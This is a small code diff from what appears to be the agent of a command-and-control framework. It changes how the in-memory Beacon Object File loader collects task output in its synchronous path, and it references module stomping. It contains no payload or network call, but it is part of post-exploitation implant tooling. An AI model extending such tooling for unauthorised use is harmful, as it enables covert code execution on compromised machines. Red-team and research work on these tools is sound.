@@ -579,14 +579,11 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
     PCHAR        mapSections[MAX_SECTIONS] = { 0 };
     BOF_STOMP_CTX* stompCtx   = NULL;
 
-    AsyncBofContext syncCtx;
-    memset(&syncCtx, 0, sizeof(syncCtx));
-    syncCtx.taskId = taskId;
-    syncCtx.state  = ASYNC_BOF_STATE_RUNNING;
-    ApiWin->InitializeCriticalSection(&syncCtx.outputLock);
-    syncCtx.outputBuffer = new Packer();
-
-    tls_CurrentBofContext = &syncCtx;
+    // Usar el sistema original de globals para el path síncrono.
+    // tls_CurrentBofContext NO se toca aquí — pertenece exclusivamente
+    // al path async (AsyncBofThreadProc). Mezclarlos rompe el monitor.
+    InitBofOutputData();
+    bofTaskId = taskId;
 
     if (!coffFile || !targetFuncName)
         goto RET;
@@ -625,11 +622,7 @@ RET:
     FreeFunctionName(entryFuncName);
     CleanupSections(mapSections, MAX_SECTIONS, mapFunctions, stompCtx);
 
-    tls_CurrentBofContext = NULL;
+    bofTaskId = 0;
 
-    Packer* outPacker = syncCtx.outputBuffer;
-    syncCtx.outputBuffer = NULL;
-    ApiWin->DeleteCriticalSection(&syncCtx.outputLock);
-
-    return outPacker;
+    return bofOutputPacker;
 }
